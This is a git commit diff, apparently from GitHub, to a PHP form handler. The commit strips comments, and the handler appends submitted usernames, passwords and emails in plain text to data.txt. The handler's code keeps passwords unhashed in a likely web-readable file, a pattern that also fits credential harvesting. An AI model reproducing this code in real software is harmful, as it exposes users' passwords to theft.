83cf8e75f47790d1fb6bba58eff7c019ace16331
Chemodan21-05 <144944596+Chemodan21-05@users.noreply.github.com>
2023-09-15 17:36:59 +0300

    Update process_form.php

--- process_form.php
+++ process_form.php
@@ -3,21 +3,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
     $email = $_POST["email"];
-
-    // Путь к файлу, в который будут записываться данные
     $file = "data.txt";
-
-    // Открываем файл для записи
     $fileHandle = fopen($file, "a");
-
     if ($fileHandle) {
-        // Форматируем данные и записываем их в файл
         $data = "Им'я користувача: $username\nПароль: $password\nEmail: $email\n\n";
         fwrite($fileHandle, $data);
-
-        // Закрываем файл
         fclose($fileHandle);
-
         echo "Дані були збережені у файлі.";
     } else {
         echo "Помилка при відкритті файлу для запису.";
